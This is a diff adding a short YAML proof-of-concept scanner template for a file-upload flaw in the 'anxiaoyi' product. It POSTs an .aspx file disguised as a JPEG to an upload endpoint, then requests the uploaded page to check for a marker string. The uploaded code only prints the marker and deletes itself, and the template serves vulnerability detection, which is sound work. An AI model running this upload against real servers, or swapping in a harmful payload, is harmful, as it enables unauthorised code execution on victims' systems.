@@ -1,0 +1,35 @@
+
+name: poc-yaml-anxiaoyi-FileUpProductupdate-files-upload
+transport: http
+  
+rules:
+  r0:
+    request:
+      method: POST
+      path: /Module/FileUpPage/FileUpProductupdate.aspx
+      headers:
+        Content-Type: multipart/form-data; boundary=----21909179191068471382830692394
+
+      body: "\
+        ------21909179191068471382830692394\r\n\
+        Content-Disposition: form-data; name=\"Filedata\"; filename=\"test.aspx\"\r\n\
+        Content-Type: image/jpeg\r\n\
+        \r\n\
+        <%@Page Language=\"C#\"%><%Response.Write(\"pboyjnnrfipmplsukdeczudsefxmywe\");System.IO.File.Delete(Request.PhysicalPath);%>\r\n\
+        ------21909179191068471382830692394--\r\n\
+        "
+    expression: response.status == 200
+  r1:
+    request:
+      method: GET
+      path: /Upload/Publish/000000/0_0_0_0/update.aspx
+    expression: response.status == 200 && response.body.bcontains(b'pboyjnnrfipmplsukdeczudsefxmywe')
+expression: r0() && r1()
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/139183576
+
+
+
